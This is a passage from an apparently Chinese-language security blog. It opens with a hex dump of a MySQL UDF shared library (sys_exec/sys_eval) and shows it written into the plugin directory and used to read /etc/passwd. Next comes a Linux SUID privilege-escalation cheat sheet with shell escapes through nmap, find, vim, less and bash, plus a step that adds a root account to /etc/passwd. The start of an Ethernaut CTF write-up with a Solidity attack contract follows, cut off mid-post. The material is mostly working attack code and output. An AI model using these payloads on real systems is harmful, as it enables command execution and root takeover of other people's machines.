0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400</span><br><span class="line"></span><br><span class="line">set @a=unhex(&#x27;7F454C46020101000000000...&#x27;);</span><br><span class="line"># Query OK, 0 row affected (0.001 sec)</span><br><span class="line"></span><br><span class="line">select @a into dumpfile &#x27;/usr/lib64/mysql/plugin/mysql-udf.so&#x27;;</span><br><span class="line"># Query OK, 1 row affected (0.001 sec)</span><br><span class="line"></span><br><span class="line">select * from mysql.func;</span><br><span class="line">/*</span><br><span class="line">+----------+-----+--------------+----------+</span><br><span class="line">| name     | ret | dl           | type     |</span><br><span class="line">+----------+-----+--------------+----------+</span><br><span class="line">| sys_eval |   0 | mysql-udf.so | function |</span><br><span class="line">+----------+-----+--------------+----------+</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">select sys_eval(&#x27;cat /etc/passwd&#x27;);</span><br><span class="line">/*</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin</span><br><span class="line">mysql:x:999:999::/var/lib/mysql:/bin/bash</span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>似乎没有提权？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;cat /etc/shadow&#x27;);</span><br><span class="line">/*</span><br><span class="line">无</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>这里环境选取的是 docker-mysql 一个镜像，默认数据库的用户是 <code>mysql</code> 没有完全的 root 权限，故而没有达到提权的作用；</p>
<p>不过结合 SSRF 可以 RCE，具体还是看 <code>whoami</code> 的结果；</p>
<h2 id="Linux-suid"><a href="#Linux-suid" class="headerlink" title="Linux suid"></a>Linux suid</h2><p>执行 <code>ls -l</code> 命令时，会有一个 10 位数的形如：</p>
<p><code>-rwsrwsrwx</code></p>
<p>的字符串，从第二位开始，每 3 位分别代表文件所有者、组用户、其他用户对于该文件的读、写、执行权限；</p>
<p>s 意为 suid，如所有者 &#x2F; 所属组执行权限为 <code>x</code> 即代表此文件在执行时其进程会以文件所有者 &#x2F; 所属组的身份运行；</p>
<h3 id="Set-owner-User-ID-up-on-execution"><a href="#Set-owner-User-ID-up-on-execution" class="headerlink" title="Set owner User ID up on execution"></a>Set owner User ID up on execution</h3><p>顾名思义，程序运行时使用所属者的权限；</p>
<p><strong>例如 <code>passwd</code> 命令，用于修改用户密码</strong>，此时修改 <code>/etc/passwd</code> &amp; <code>/etc/shadow</code>，需要 root 权限，这里就要用 suid 机制进行授权；</p>
<h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><h4 id="查找-SUID-文件"><a href="#查找-SUID-文件" class="headerlink" title="查找 SUID 文件"></a>查找 SUID 文件</h4><p>使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找 root suid</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 查找 root suid 并以长格式列出</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br><span class="line"><span class="comment"># 查找所有 suid</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h4 id="可利用程序"><a href="#可利用程序" class="headerlink" title="可利用程序"></a>可利用程序</h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>要求版本在 <code>2.02-5.21</code> ；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># root</span></span><br></pre></td></tr></table></figure>

<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><p>find 可以执行命令；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> middle</span><br><span class="line">find middle -<span class="built_in">exec</span> <span class="built_in">whoami</span> ;</span><br><span class="line"><span class="comment"># root</span></span><br></pre></td></tr></table></figure>

<h5 id="vim-vi"><a href="#vim-vi" class="headerlink" title="vim&#x2F;vi"></a>vim&#x2F;vi</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 –salt abc 123456</span><br></pre></td></tr></table></figure>

<p>这会生成一个散列值，可以利用 suid vim 在 <code>/etc/passwd</code> 中添加如下行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack:$1$abc$hash:0:0:root:/hack:/bin/bash</span><br></pre></td></tr></table></figure>

<p>就成功添加了一个 root 用户可以用；</p>
<p>还有一种直接拿 shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line"><span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<h5 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># root</span></span><br></pre></td></tr></table></figure>

<h5 id="less-more"><a href="#less-more" class="headerlink" title="less&#x2F;more"></a>less&#x2F;more</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<h5 id="python-perl-ruby-lua-php-etc"><a href="#python-perl-ruby-lua-php-etc" class="headerlink" title="python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc"></a>python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc</h5><p>root 身份写各自语言的代码执行；</p>
<h5 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h5><p>覆盖 <code>/etc/passwd</code> ，和 vim 相同；</p>
<h5 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h5><p>覆盖 <code>/etc/passwd</code> ，和 vim 相同；</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>suid 没有做复现，这两天过于忙，有时间补充；</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/04/2024-09-04-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/04/2024-09-04-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%81/" class="post-title-link" itemprop="url">区块链学习之叁</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-04 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-04T00:00:00+08:00">2024-09-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:17:26" itemprop="dateModified" datetime="2024-09-19T21:17:26+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="区块链学习之叁"><a href="#区块链学习之叁" class="headerlink" title="区块链学习之叁"></a>区块链学习之叁</h1><p>损耗送：纵欲也是修行的一种，水木之气先行；</p>
<h2 id="ethernaut-Gatekeeper-Two"><a href="#ethernaut-Gatekeeper-Two" class="headerlink" title="ethernaut - Gatekeeper Two"></a>ethernaut - Gatekeeper Two</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</span><br><span class="line"></span><br><span class="line">// Things that might help:</span><br><span class="line">// Remember what you&#x27;ve learned from getting past the first gatekeeper - the first gate is the same.</span><br><span class="line">// The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See Solidity Assembly for more information. The extcodesize call in this gate will get the size of a contract&#x27;s code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.</span><br><span class="line">// The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see Solidity cheatsheet). The Coin Flip level is also a good place to start when approaching this challenge.</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接看<code>gateTwo()</code>；</p>
<p>乍一看<code>gateOne()</code>与<code>gateTwo()</code>好像冲突，因为<code>gateOne()</code>要求用第三方合约调用函数，而<code>gateTwo()</code>要求<code>caller()</code>（等价于<code>msg.sender</code>）没有代码；</p>
<p>只有不存在的合约和钱包合约是没有代码的；</p>
<p>然而，在合约构造函数执行过程中，<code>caller()</code>是还没有被部署到目标 block 上的，此时调用<code>extcodesize(caller())</code>就可以得到<code>0</code>，因此可以在构造函数中调用<code>enter()</code>成功绕过<code>gateTwo()</code>；</p>
<p>再看<code>gateThree()</code>，一个异或，能 pass 的<code>_gatekey</code>值应当是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</span><br></pre></td></tr></table></figure>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><strong>attack contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line">    constructor(address _victim) &#123;</span><br><span class="line">        bytes8 gatekey;</span><br><span class="line">        gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);</span><br><span class="line">        _victim.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, gatekey));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署即可；</p>
<h2 id="ethernaut-Naught-Coin"><a href="#ethernaut-Naught-Coin" class="headerlink" title="ethernaut - Naught Coin"></a>ethernaut - Naught Coin</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// NaughtCoin is an ERC20 token and you&#x27;re already holding all of them. The catch is that you&#x27;ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</span><br><span class="line"></span><br><span class="line">//   Things that might help</span><br><span class="line"></span><br><span class="line">// The ERC20 Spec</span><br><span class="line">// The OpenZeppelin codebase</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td 